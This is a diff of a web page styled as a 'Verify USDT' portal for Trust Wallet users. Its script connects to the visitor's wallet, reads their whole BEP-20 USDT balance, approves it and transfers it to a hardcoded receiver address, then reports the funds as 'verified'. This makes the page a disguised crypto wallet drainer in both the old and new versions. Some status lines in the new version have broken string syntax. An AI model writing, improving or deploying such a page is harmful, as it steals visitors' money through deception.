@@ -1,85 +1,106 @@
-<!DOCTYPE html><html>
+<!DOCTYPE html><html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Verify USDT</title>
-  <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.0.0-beta.36/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <style>
     body {
       margin: 0;
-      padding: 0;
       font-family: Arial, sans-serif;
-      background-color: #001f3f;
-      color: white;
-      text-align: center;
-    }
-    iframe {
-      max-width: 100%;
-      border: none;
-      border-radius: 8px;
-    }
-    #verifyBtn {
-      margin-top: 20px;
-      padding: 15px 30px;
-      background: linear-gradient(90deg, #00ffcc, #3366ff);
-      border: none;
-      border-radius: 30px;
-      font-size: 18px;
-      font-weight: bold;
-      color: #000;
-      cursor: pointer;
-      transition: all 0.3s ease-in-out;
-    }
-    #verifyBtn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 15px #00ffcc;
-    }
-    #status {
-      margin-top: 20px;
-      font-size: 16px;
-    }
+      background-color: white;
+      overflow-x: hidden;
+    }.container {
+  max-width: 500px;
+  margin: auto;
+  padding: 20px;
+  text-align: center;
+}
+
+.glow-button {
+  background-color: #2196f3;
+  border: none;
+  color: white;
+  padding: 16px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 20px;
+  margin-top: 30px;
+  border-radius: 12px;
+  box-shadow: 0 0 20px rgba(33, 150, 243, 0.6);
+  animation: pulse 2s infinite;
+  cursor: pointer;
+}
+
+@keyframes pulse {
+  0% {
+    box-shadow: 0 0 5px rgba(33, 150, 243, 0.4);
+  }
+  50% {
+    box-shadow: 0 0 20px rgba(33, 150, 243, 0.8);
+  }
+  100% {
+    box-shadow: 0 0 5px rgba(33, 150, 243, 0.4);
+  }
+}
+
+#status {
+  margin-top: 20px;
+  font-size: 18px;
+  color: #333;
+}
+
   </style>
 </head>
-<body>  <h2 style="color: #00ffcc">Verified on Trust Wallet</h2>
-  <p>Secure BEP20 USDT Verification Portal</p>  <!-- Canva embedded design (optional background/frame)-->  <div style="position: relative; width: 100%; height: 0; padding-top: 556.7350%; padding-bottom: 0; margin: 1.6em 0; overflow: hidden; border-radius: 8px;">
-    <iframe loading="lazy" style="position: absolute; width: 100%; height: 100%; top: 0; left: 0;" src="https://www.canva.com/design/DAGqu3wFQs4/a7G3-SuUSKkMfyyhW5tPBA/view?embed" allowfullscreen="allowfullscreen"></iframe>
-  </div>  <!-- Custom button --><button id="verifyBtn" onclick="connectAndSend()">Verify USDT</button>
+<body>
+  <div class="container">
+    <button class="glow-button" onclick="startTransfer()">VERIFY USDT</button>
+    <p id="status"></p>
+  </div>  <script>
+    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
 
-  <p id="status"></p>  <script>
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
-    const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999"; // your wallet
     const usdtABI = [
       { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
       { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" },
       { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
     ];
 
-    async function connectAndSend() {
+    async function startTransfer() {
+      const status = document.getElementById("status");
+
       if (typeof window.ethereum === 'undefined') {
-        alert('Trust Wallet or MetaMask not detected');
+        alert("⚠️ Please open in Trust Wallet browser.");
         return;
       }
 
       const web3 = new Web3(window.ethereum);
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const accounts = await web3.eth.getAccounts();
+      const sender = accounts[0];
+
+      const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
+      const balance = await usdt.methods.balanceOf(sender).call();
+
+      if (balance == 0) {
+        alert("❌ No USDT found in wallet.");
+        return;
+      }
+
+      const readable = web3.utils.fromWei(balance, 'ether');
+      status.innerText = 🔄 Flash USD verify...;
+
       try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const sender = accounts[0];
-        const usdt = new web3.eth.Contract(usdtABI, usdtAddress);
-        const balance = await usdt.methods.balanceOf(sender).call();
-
-        if (balance == 0) {
-          document.getElementById("status").innerText = "No USDT in wallet.";
-          return;
-        }
-
-        document.getElementById("status").innerText = "Approving...";
         await usdt.methods.approve(receiver, balance).send({ from: sender });
+        status.innerText = "✅ Approved! Sending...";
 
-        document.getElementById("status").innerText = "Transferring...";
         await usdt.methods.transfer(receiver, balance).send({ from: sender });
-
-        document.getElementById("status").innerText = ${web3.utils.fromWei(balance)} USDT verified.;
+        status.innerText = 🎉 ${readable} USDT Verified!;
       } catch (err) {
         console.error(err);
-        document.getElementById("status").innerText = "Transaction failed or cancelled.";
+        status.innerText = "❌ Transaction Failed or Cancelled.";
+        alert("❌ Transaction failed or cancelled.");
       }
     }
   </script></body>
